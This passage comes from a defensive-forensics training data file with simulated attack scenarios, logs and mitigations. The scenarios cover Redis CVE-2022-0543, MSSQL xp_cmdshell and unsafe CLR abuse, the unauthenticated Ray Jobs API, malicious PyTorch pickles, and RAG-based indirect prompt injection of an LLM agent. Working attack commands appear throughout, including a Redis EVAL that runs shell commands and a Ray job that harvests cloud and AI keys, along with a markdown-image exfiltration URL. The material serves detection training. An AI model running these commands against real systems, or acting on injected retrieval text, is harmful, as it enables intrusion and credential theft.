          'Although upstream Redis removes os and io globals from the Lua sandbox, vulnerable Debian/Ubuntu packages left the global package variable populated. An EVAL script calls package.loadlib on liblua5.1.so.0 to re-import luaopen_io into the Lua runtime.',
        activeNodes: ['firewall', 'target', 'ad', 'siem'],
        mitreTactic: 'Execution (T1059 - Command and Scripting Interpreter: Redis Lua EVAL)',
        technicalCommands: [
          'redis-cli EVAL \'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res\' 0',
        ],
        defenseMitigation:
          'Apply Debian DSA-5081 / Ubuntu USN-5316-1 updates (which clear the package global table during Lua VM initialization) and disable EVAL via Redis ACLs (nopass ~* -@all +@read).',
        logs: [
          {
            id: 'db-redis-2',
            timestamp: '15:04:14.520',
            source: 'Linux Audit',
            severity: 'critical',
            EventCode: 543,
            ProcessName: 'redis-server',
            CommandLine: 'EVAL "local io_l = package.loadlib(\'/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\', \'luaopen_io\')..." 0',
            raw: 'redis_monitor: 1763305454.520114 [0 10.10.4.19:48102] "EVAL" "local io_l = package.loadlib(\\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\\", \\"luaopen_io\\"); ..." "0"',
            parsedFields: {
              RedisCommand: 'EVAL (Lua Sandbox Execution)',
              SharedLibraryLoaded: '/usr/lib/x86_64-linux-gnu/liblua5.1.so.0 (luaopen_io)',
              VulnerabilityId: 'CVE-2022-0543',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: Child Shell Spawn (io.popen -> /bin/sh) Under redis-server PID in Linux auditd',
        narration:
          'When io.popen() executes inside the Redis Lua VM, the Linux kernel records a sys_execve (59) system call where parent process /usr/bin/redis-server spawns /bin/sh—a deterministic high-confidence indicator of Redis RCE.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Execution (T1203 - Exploitation for Client Execution)',
        technicalCommands: [
          'ausearch -pp $(pgrep redis-server) -m SYSCALL -i',
        ],
        defenseMitigation:
          'Harden the redis.service systemd unit with SystemCallFilter=~@process (or NoNewPrivileges=true and ProtectSystem=strict) and alert on any child process spawned by redis-server.',
        logs: [
          {
            id: 'db-redis-3',
            timestamp: '15:04:14.535',
            source: 'Linux Audit',
            severity: 'critical',
            EventCode: 59,
            ProcessName: 'sh',
            CommandLine: '/bin/sh -c id',
            raw: 'type=SYSCALL msg=audit(1763305454.535:902): arch=c000003e syscall=59 success=yes ppid=1120 pid=9412 uid=114 exe="/usr/bin/dash" comm="sh" key="redis_child_exec"',
            parsedFields: {
              ParentProcess: '/usr/bin/redis-server (PID 1120, uid=114 redis)',
              ChildExecutable: '/bin/sh -c id',
              DetectionRule: 'Sigma: proc_creation_lnx_redis_child_shell',
            },
          },
        ],
      },
    ],
  },
  {
    id: 'db-mssql-linked-server-clr-assembly-xp-cmdshell-forensics',
    title: 'Microsoft SQL Server Security, Mandiant & MITRE T1505.001 — MSSQL Linked Server RPC, xp_cmdshell & Unsafe CLR Assembly Forensics',
    category: 'DATABASE_DATA_PLATFORMS',
    mitreId: 'T1505.001',
    description:
      'Grounded in Microsoft SQL Server security documentation, Mandiant SQL Server post-exploitation analysis, and MITRE ATT&CK T1505.001 (Server Software Component: SQL Stored Procedures): DFIR analysts investigate Lateral Movement across MSSQL Linked Servers (EXEC AT / OPENQUERY), sp_configure xp_cmdshell activation (EventID 15457), and fileless Unsafe CLR Assembly registration in sys.assemblies.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Web App SQLi / Compromised Login', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'MSSQL Linked Server RPC (:1433)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'sqlservr.exe (Database Engine)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Windows Application Log EID 15457', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'sys.assemblies (CLR Runtime)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: MSSQL Linked Server Enumeration (sys.servers) & RPC Trust Pivot',
        narration:
          'From an initial SQL connection, the operator queries sys.servers and sys.linked_logins to discover trusted Linked Servers configured with is_rpc_out_enabled = 1 and mapped to a remote sysadmin login.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Lateral Movement (T1021 - Remote Services / MSSQL Linked Server Traversal)',
        technicalCommands: [
          'SELECT name, product, provider, data_source, is_linked, is_rpc_out_enabled FROM sys.servers;',
          'EXEC (\'SELECT @@servername, SYSTEM_USER, IS_SRVROLEMEMBER(\'\'sysadmin\'\')\') AT [CORP-SQL02];',
        ],
        defenseMitigation:
          'Audit sys.linked_logins across all SQL Server instances, never map low-privileged local logins to remote sysadmin accounts, and disable RPC Out (is_rpc_out_enabled = 0) unless strictly required.',
        logs: [
          {
            id: 'db-mssql-1',
            timestamp: '17:20:02.114',
            source: 'WinEvent',
            severity: 'high',
            EventCode: 33205,
            ProcessName: 'sqlservr.exe',
            CommandLine: 'EXEC (\'SELECT @@servername, SYSTEM_USER\') AT [CORP-SQL02]',
            raw: 'MSSQL_Audit: EventID=33205 action_id=EX statement="EXEC (\'SELECT @@servername, SYSTEM_USER\') AT [CORP-SQL02]" server_principal_name="sa_linked"',
            parsedFields: {
              SqlAuditEventId: '33205 (SQL Server Audit Action)',
              LinkedServerTarget: 'CORP-SQL02 (TCP 1433)',
              RemotePrincipal: 'sa_linked (sysadmin role)',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Configuration Change Enabling xp_cmdshell & clr strict security (Application EventID 15457)',
        narration:
          'When sp_configure is executed to enable show advanced options, xp_cmdshell, or clr enabled, Microsoft SQL Server writes a deterministic EventID 15457 entry into the Windows Application Event Log recording the old and new configuration values.',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Defense Evasion (T1562 - Modify SQL Server Configuration / EventID 15457)',
        technicalCommands: [
          'EXEC sp_configure \'show advanced options\', 1; RECONFIGURE; EXEC sp_configure \'xp_cmdshell\', 1; RECONFIGURE;',
          'Get-WinEvent -FilterHashtable @{LogName="Application"; Id=15457}',
        ],
        defenseMitigation:
          'Forward Windows Application EventID 15457 to the SIEM and trigger an immediate high-severity alert whenever xp_cmdshell, Ole Automation Procedures, or clr strict security is modified.',
        logs: [
          {
            id: 'db-mssql-2',
            timestamp: '17:20:08.640',
            source: 'WinEvent',
            severity: 'critical',
            EventCode: 15457,
            ProcessName: 'sqlservr.exe',
            CommandLine: 'sp_configure \'xp_cmdshell\', 1; RECONFIGURE;',
            raw: 'WinEvent_Application: Provider="MSSQLSERVER" EventID=15457 Message="Configuration option \'xp_cmdshell\' changed from 0 to 1. Run the RECONFIGURE statement to install."',
            parsedFields: {
              EventID: '15457 (MSSQL Configuration Option Changed)',
              ConfigurationOption: 'xp_cmdshell (0 -> 1)',
              HostProcess: 'sqlservr.exe',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: In-Memory Hexadecimal CLR Assembly Registration (CREATE ASSEMBLY ... PERMISSION_SET = UNSAFE)',
        narration:
          'To persist custom .NET stored procedures without dropping a .dll file to the Windows filesystem, the attacker executes CREATE ASSEMBLY FROM 0x4D5A... WITH PERMISSION_SET = UNSAFE, storing the compiled PE bytes directly inside sys.assembly_files.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Persistence (T1505.001 - Server Software Component: SQL Stored Procedures / CLR Assembly)',
        technicalCommands: [
          'CREATE ASSEMBLY [SqlDiagnosticExt] AUTHORIZATION [dbo] FROM 0x4D5A900003000000... WITH PERMISSION_SET = UNSAFE;',
          'SELECT a.name, a.permission_set_desc, a.create_date, af.content FROM sys.assemblies a JOIN sys.assembly_files af ON a.assembly_id = af.assembly_id WHERE a.is_user_defined = 1;',
        ],
        defenseMitigation:
          'Keep clr strict security enabled (1) on all SQL Server 2017+ instances and audit sys.assemblies and sys.assembly_files for user-defined assemblies with permission_set_desc = UNSAFE_ACCESS.',
        logs: [
          {
            id: 'db-mssql-3',
            timestamp: '17:20:15.309',
            source: 'WinEvent',
            severity: 'critical',
            EventCode: 33205,
            ProcessName: 'sqlservr.exe',
            CommandLine: 'CREATE ASSEMBLY [SqlDiagnosticExt] FROM 0x4D5A9000... WITH PERMISSION_SET = UNSAFE',
            raw: 'MSSQL_Audit: EventID=33205 class_type="AS" action_id="CR" object_name="SqlDiagnosticExt" statement="CREATE ASSEMBLY [SqlDiagnosticExt] FROM 0x4D5A9000... WITH PERMISSION_SET = UNSAFE"',
            parsedFields: {
              CatalogTable: 'sys.assemblies / sys.assembly_files',
              AssemblyName: 'SqlDiagnosticExt',
              PermissionSet: 'UNSAFE_ACCESS (Full OS & Network Access inside sqlservr.exe)',
            },
          },
        ],
      },
    ],
  },

  // ============================================================================
  // CATEGORY 5: AI_LLM_MLOPS_SECURITY (AI, LLM Agents & MLOps Security)
  // ============================================================================
  {
    id: 'ai-shadowray-ray-jobs-api-gpu-cluster-cve-2023-48022',
    title: 'Oligo ShadowRay Research, NIST NVD & MITRE ATLAS AML.T0018 — Ray AI Framework Unauthenticated Jobs API & GPU Cluster Forensics (CVE-2023-48022)',
    category: 'AI_LLM_MLOPS_SECURITY',
    mitreId: 'T1190',
    description:
      'Grounded in Oligo Security ShadowRay research, NIST NVD CVE-2023-48022, and MITRE ATLAS (AML.T0018 — Exploit Public-Facing AI/ML Application): MLOps security teams investigate unauthenticated HTTP POST requests to the Ray Dashboard Jobs API (:8265 /api/jobs/) that schedule distributed Python/shell tasks across GPU worker nodes and access cloud/AI secrets.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'External Scanner / API Client', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Ray Dashboard API (:8265)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Ray Head & GPU Worker Nodes', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Ray Dashboard Log & CloudTrail', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'HF_TOKEN / OPENAI_API_KEY / IAM', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Exposed Ray Dashboard Discovery & Cluster Node Metadata Query (:8265/nodes)',
        narration:
          'Ray head nodes expose the Ray Dashboard and Jobs Submission HTTP server on TCP port 8265 without built-in authentication by default. Querying GET /nodes?view=summary returns GPU hardware specs, internal worker IPs, and runtime environment variables.',
        activeNodes: ['attacker', 'firewall', 'siem'],
        mitreTactic: 'Discovery (T1046 - AI/ML Cluster Service Discovery / Port 8265)',
        technicalCommands: [
          'curl -s http://10.80.10.50:8265/api/version',
          'curl -s "http://10.80.10.50:8265/nodes?view=summary" | jq ".data.summary[].ip"',
        ],
        defenseMitigation:
          'Never expose Ray Dashboard port 8265 or GCS port 6379 outside localhost/VPC security groups; place an authenticating reverse proxy (OAuth2 / mTLS) in front of the Ray Dashboard.',
        logs: [
          {
            id: 'ai-ray-1',
            timestamp: '18:05:10.112',
            source: 'Network',
            severity: 'high',
            EventCode: 8265,
            ProcessName: 'dashboard.py',
            CommandLine: 'GET /nodes?view=summary HTTP/1.1 (Ray Dashboard Port 8265)',
            raw: 'ray_dashboard_access: 2026-11-16 18:05:10,112 INFO http_server.py:142 -- 198.51.100.77 "GET /nodes?view=summary HTTP/1.1" 200 18420',
            parsedFields: {
              MlopsFramework: 'Ray Distributed AI Framework (TCP 8265)',
              EndpointQueried: 'GET /nodes?view=summary',
              VulnerabilityId: 'CVE-2023-48022 (Unauthenticated Ray Jobs API)',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Unauthenticated Job Submission via POST /api/jobs/ Executing entrypoint Command',
        narration:
          'By sending an HTTP POST request to /api/jobs/ with a JSON body containing {"entrypoint": "<shell_command>"}, the Ray JobSupervisor actor immediately spawns a subprocess on the GPU cluster to execute the entrypoint command.',
        activeNodes: ['attacker', 'firewall', 'target', 'siem'],
        mitreTactic: 'Execution (T1059.004 - Command and Scripting Interpreter / MITRE ATLAS AML.T0018)',
        technicalCommands: [
          'curl -X POST http://10.80.10.50:8265/api/jobs/ -H "Content-Type: application/json" -d \'{"entrypoint": "env | grep -E \\"AWS_|OPENAI_|HF_|WANDB_\\""}\'',
          'ray job list --address=http://127.0.0.1:8265',
        ],
        defenseMitigation:
          'Monitor /tmp/ray/session_latest/logs/dashboard_agent.log and job-driver-*.log for unexpected job_id submissions and alert on non-Python shell entrypoints.',
        logs: [
          {
            id: 'ai-ray-2',
            timestamp: '18:05:14.890',
            source: 'Linux Audit',
            severity: 'critical',
            EventCode: 59,
            ProcessName: 'ray::JobSupervi',
            CommandLine: 'POST /api/jobs/ {"entrypoint": "env | grep -E AWS_|OPENAI_|HF_|WANDB_"}',
            raw: 'ray_job_driver: 2026-11-16 18:05:14,890 INFO job_manager.py:318 -- Submitting job with submission_id="raysubmit_9a82b1c4" entrypoint="env | grep -E AWS_|OPENAI_|HF_|WANDB_"',
            parsedFields: {
              RaySubmissionId: 'raysubmit_9a82b1c4',
              JobEntrypoint: 'env | grep -E "AWS_|OPENAI_|HF_|WANDB_"',
              AtlasTechnique: 'MITRE ATLAS AML.T0018',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: AI Model Weights & API Token Harvesting from GPU Worker Environment',
        narration:
          'Because MLOps training jobs commonly pass HuggingFace tokens (HF_TOKEN), Weights & Biases keys (WANDB_API_KEY), OpenAI keys, and S3 model bucket credentials in worker runtime_env variables, the rogue Ray job harvests those secrets across all connected GPU nodes.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Credential Access (T1552.001 - Credentials In Environment & Model Stores)',
        technicalCommands: [
          'cat /tmp/ray/session_latest/logs/job-driver-raysubmit_9a82b1c4.log',
        ],
        defenseMitigation:
          'Inject short-lived, least-privilege IAM roles per job rather than static cluster-wide environment variables, and rotate all HuggingFace, WandB, and cloud keys if port 8265 was exposed.',
        logs: [
          {
            id: 'ai-ray-3',
            timestamp: '18:05:16.204',
            source: 'Linux Audit',
            severity: 'critical',
            EventCode: 200,
            ProcessName: 'python3',
            CommandLine: 'ray job logs raysubmit_9a82b1c4 --address=http://10.80.10.50:8265',
            raw: 'ray_dashboard_access: 2026-11-16 18:05:16,204 INFO http_server.py:142 -- 198.51.100.77 "GET /api/jobs/raysubmit_9a82b1c4/logs HTTP/1.1" 200',
            parsedFields: {
              LogEndpoint: 'GET /api/jobs/raysubmit_9a82b1c4/logs',
              ExposedSecretsScope: 'HF_TOKEN, WANDB_API_KEY, AWS_SESSION_TOKEN',
              ClusterNodeScope: 'All Ray Worker Nodes in Cluster',
            },
          },
        ],
      },
    ],
  },
  {
    id: 'ai-pytorch-pickle-torch-load-supply-chain-forensics',
    title: 'MITRE ATLAS AML.T0010, Trail of Bits fickling & HuggingFace Security — PyTorch Pickle Model Checkpoint Deserialization Forensics',
    category: 'AI_LLM_MLOPS_SECURITY',
    mitreId: 'T1195.002',
    description:
      'Grounded in MITRE ATLAS AML.T0010 (ML Supply Chain Compromise: Malicious Model Artifact), Trail of Bits fickling research, and HuggingFace Pickle Scanning documentation: AI security engineers analyze a PyTorch model checkpoint (.pt / .bin ZIP archive containing archive/data.pkl) that embeds a Python pickle GLOBAL + REDUCE opcode sequence executing arbitrary code during torch.load().',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Model Hub Repository (.pt/.bin)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'archive/data.pkl Pickle Stream', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Python torch.load() Process', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'fickling AST & Linux auditd', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Safetensors / weights_only Gate', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: PyTorch ZIP Archive Inspection & Pickle Opcode Disassembly (pickletools / fickling)',
        narration:
          'Standard PyTorch .pt and .bin checkpoints are ZIP archives containing tensor storage files alongside archive/data.pkl. Disassembling data.pkl with python3 -m pickletools or fickling reveals STACK_GLOBAL / REDUCE opcodes referencing posix.system, subprocess.Popen, or builtins.eval.',
        activeNodes: ['attacker', 'firewall', 'siem'],
        mitreTactic: 'Initial Access (T1195.002 - Supply Chain Compromise: ML Model Checkpoint / AML.T0010)',
        technicalCommands: [
          'python3 -m pickletools -a archive/data.pkl | grep -E "GLOBAL|STACK_GLOBAL|REDUCE"',
          'fickling --check-safety -p model_weights.pt',
        ],
        defenseMitigation:
          'Migrate model distribution from Pickle-based (.pt / .bin) formats to HuggingFace Safetensors (.safetensors), which enforces zero-copy header parsing with no arbitrary code execution capability.',
        logs: [
          {
            id: 'ai-pkl-1',
            timestamp: '19:15:02.100',
            source: 'Linux Audit',
            severity: 'high',
            EventCode: 10,
            ProcessName: 'fickling',
            CommandLine: 'fickling --check-safety -p model_weights.pt',
            raw: 'fickling_scan: file="model_weights.pt" inner_pickle="archive/data.pkl" severity="OVERTLY_MALICIOUS" opcodes="STACK_GLOBAL (posix system) -> REDUCE"',
            parsedFields: {
              ModelArchive: 'model_weights.pt (archive/data.pkl)',
              DangerousOpcodes: 'STACK_GLOBAL (\'posix\', \'system\') + REDUCE (0x52)',
              AtlasTechnique: 'MITRE ATLAS AML.T0010 (ML Supply Chain Compromise)',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Legacy torch.load() Invocation Without weights_only=True Triggering __reduce__()',
        narration:
          'When an inference or fine-tuning script calls torch.load("model_weights.pt") without weights_only=True, Python pickle.Unpickler executes the REDUCE opcode immediately during deserialization—before the model state_dict is even returned to the caller.',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Execution (T1203 - Deserialization of Untrusted Data in torch.load)',
        technicalCommands: [
          'python3 -c "import torch; torch.load(\'model_weights.pt\', weights_only=True)"',
        ],
        defenseMitigation:
          'Always pass weights_only=True to torch.load() (the default in PyTorch 2.6+), which restricts the unpickler to primitive tensor reconstruction types only.',
        logs: [
          {
            id: 'ai-pkl-2',
            timestamp: '19:15:08.440',
            source: 'Linux Audit',
            severity: 'critical',
            EventCode: 59,
            ProcessName: 'python3',
            CommandLine: 'python3 inference_server.py --checkpoint model_weights.pt',
            raw: 'type=SYSCALL msg=audit(1763320508.440:941): arch=c000003e syscall=59 success=yes ppid=8810 pid=8842 exe="/usr/bin/curl" comm="curl" key="python_pickle_exec"',
            parsedFields: {
              ParentInferenceProcess: 'python3 inference_server.py (PID 8810)',
              UnpicklerHook: 'pickle._Unpickler.load_reduce() -> posix.system()',
              MitigationCheck: 'torch.load(..., weights_only=True)',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: Runtime eBPF / Sysmon Detection of Python Inference Worker Spawning Subprocesses',
        narration:
          'Even if a malicious pickle payload uses obfuscated builtins.getattr chains to bypass static pickle scanners, runtime monitoring catches the Python inference worker process invoking sys_execve or initiating outbound connections to untrusted IPs.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Defense Evasion (T1027 - Obfuscated Pickle Bytecode / Runtime Behavioral Catch)',
        technicalCommands: [
          'ausearch -k python_pickle_exec -i',
        ],
        defenseMitigation:
          'Run model loading and inference inside network-isolated, read-only containers with seccomp profiles blocking execve after Python startup.',
        logs: [
          {
            id: 'ai-pkl-3',
            timestamp: '19:15:09.115',
            source: 'Linux Audit',
            severity: 'critical',
            EventCode: 42,
            ProcessName: 'python3',
            CommandLine: 'auditctl -a always,exit -F arch=b64 -S execve -F ppid=8810 -k python_pickle_exec',
            raw: 'falco_alert: priority=CRITICAL rule="Python AI Inference Process Spawned Shell or Network Utility" proc.pname="python3" proc.cmdline="sh -c curl -s https://198.51.100.90/telemetry"',
            parsedFields: {
              RuntimeRule: 'Falco: Python AI Inference Process Spawned Shell',
              ParentProcess: 'python3 (Model Loader)',
              RecommendedFormat: 'HuggingFace .safetensors',
            },
          },
        ],
      },
    ],
  },
  {
    id: 'ai-rag-indirect-prompt-injection-mcp-tool-audit',
    title: 'OWASP LLM01:2025, NIST AI 100-2 & MITRE ATLAS AML.T0051 — Indirect Prompt Injection via RAG Vector Retrieval & Agent/MCP Tool Audit',
    category: 'AI_LLM_MLOPS_SECURITY',
    mitreId: 'T1059',
    description:
      'Grounded in OWASP Top 10 for LLM Applications (LLM01:2025 Prompt Injection & LLM06 Excessive Agency), NIST AI 100-2 E2023, and MITRE ATLAS AML.T0051: AI security analysts trace an Indirect Prompt Injection stored inside an external knowledge document retrieved by a Retrieval-Augmented Generation (RAG) vector query, which hijacks the LLM agent context to invoke privileged Model Context Protocol (MCP) / function-calling tools.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Ingested External Document', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Vector DB Top-K RAG Retrieval', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'LLM Agent & Tool Orchestrator', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'LLM Guardrail & MCP Audit Log', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Internal MCP Tool / SQL API', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Untrusted Document Embedding & Top-K Similarity Retrieval from Vector Database',
        narration:
          'An external document (such as a resume PDF, support ticket, or web page) containing hidden instruction-override directives is chunked, embedded into the vector database, and retrieved into the LLM context window during a user RAG query.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Initial Access (T1190 - Indirect Prompt Injection via Retrieved RAG Context / AML.T0051.001)',
        technicalCommands: [
          'jq \'. | select(.event=="rag_context_retrieved") | {query_id, chunk_ids, source_uris}\' /var/log/ai-gateway/rag-audit.json',
        ],
        defenseMitigation:
          'Enforce strict data-instruction separation (delimiters / Spotlight tagging of untrusted RAG chunks) and run input classifiers (Prompt Shields / Llama Guard) over retrieved vector chunks before assembling the prompt.',
        logs: [
          {
            id: 'ai-rag-1',
            timestamp: '20:01:10.305',
            source: 'Application Log',
            severity: 'high',
            EventCode: 1051,
            ProcessName: 'rag-retriever',
            CommandLine: 'vector_db.similarity_search(query="Q4 Vendor Summary", top_k=5)',
            raw: 'rag_audit: {"event":"rag_context_retrieved","query_id":"req_7712a","chunk_id":"doc_ext_9941#chunk2","similarity":0.892,"trust_level":"UNTRUSTED_EXTERNAL"}',
            parsedFields: {
              RetrievedChunkId: 'doc_ext_9941#chunk2 (TrustLevel=UNTRUSTED_EXTERNAL)',
              CosineSimilarity: '0.892 (Included in Top-K Prompt Context)',
              OwaspCategory: 'OWASP LLM01:2025 (Indirect Prompt Injection)',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Unauthorized Agent Tool Call Generation (MCP tool_calls JSON Invocation)',
        narration:
          'When the LLM processes the untrusted RAG chunk alongside the user prompt, the injected directive instructs the model to emit a structured tool_calls JSON payload targeting an internal MCP server tool (such as query_customer_db or send_webhook).',
        activeNodes: ['firewall', 'target', 'ad', 'siem'],
        mitreTactic: 'Execution (T1059 - Agent Tool & Function Calling Abuse / OWASP LLM06 Excessive Agency)',
        technicalCommands: [
          'jq \'. | select(.finish_reason=="tool_calls") | {request_id, tool_name: .tool_calls[].function.name, arguments: .tool_calls[].function.arguments}\' /var/log/ai-gateway/agent-traces.json',
        ],
        defenseMitigation:
          'Enforce Human-in-the-Loop (HITL) confirmation and deterministic policy-engine authorization checks before executing state-changing or data-exporting MCP tool calls when untrusted RAG context is present in the conversation.',
        logs: [
          {
            id: 'ai-rag-2',
            timestamp: '20:01:12.140',
            source: 'Application Log',
            severity: 'critical',
            EventCode: 1052,
            ProcessName: 'mcp-orchestrator',
            CommandLine: 'mcp.call_tool(name="export_directory_records", arguments={"filter":"*"})',
            raw: 'mcp_audit: {"event":"tool_call_requested","request_id":"req_7712a","context_tainted_by_untrusted_rag":true,"tool_name":"export_directory_records","arguments":{"filter":"*"}}',
            parsedFields: {
              McpToolInvoked: 'export_directory_records',
              ContextTaintStatus: 'context_tainted_by_untrusted_rag = true',
              SecurityStandard: 'NIST AI 100-2 & OWASP LLM06 (Excessive Agency)',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: Deterministic Policy Gate Interception & Outbound Markdown Image/Link Exfiltration Audit',
        narration:
          'If the tool output is returned to the model, indirect injection payloads often attempt to exfiltrate the result by rendering an external Markdown image URL (![tracker](https://attacker.tld/collect?data=...)). Content Security Policy (CSP) img-src rules and AI gateway egress filters block and log the attempt.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Exfiltration (T1041 - Exfiltration via Rendered Markdown URI / AI Gateway Audit)',
        technicalCommands: [
          'grep -E "\\!\\[.*\\]\\(https?://" /var/log/ai-gateway/response-audit.log',
        ],
        defenseMitigation:
          'Strip or proxy external Markdown images and links in LLM UI renderers, enforce a strict Content-Security-Policy (img-src \'self\'), and block autonomous tool calls when the prompt taint flag is set.',
        logs: [
          {
            id: 'ai-rag-3',
            timestamp: '20:01:13.890',
            source: 'IDS Alert',
            severity: 'critical',
            EventCode: 1053,
            ProcessName: 'ai-guardrail',
            CommandLine: 'AI Gateway Policy Block: Tainted Context Tool Invocation & External Markdown URI',
            raw: 'ai_guardrail_alert: {"request_id":"req_7712a","action":"BLOCKED","reason":"High-privilege MCP tool call attempted while context_tainted_by_untrusted_rag=true","atlas_id":"AML.T0051"}',
            parsedFields: {
              GuardrailDecision: 'BLOCKED (Tainted Context Policy Enforcement)',
              AtlasTechnique: 'MITRE ATLAS AML.T0051 & AML.T0048',
              DefensiveControl: 'Deterministic Taint Tracking + CSP img-src Isolation',
            },
          },
        ],
      },
    ],
  },
];
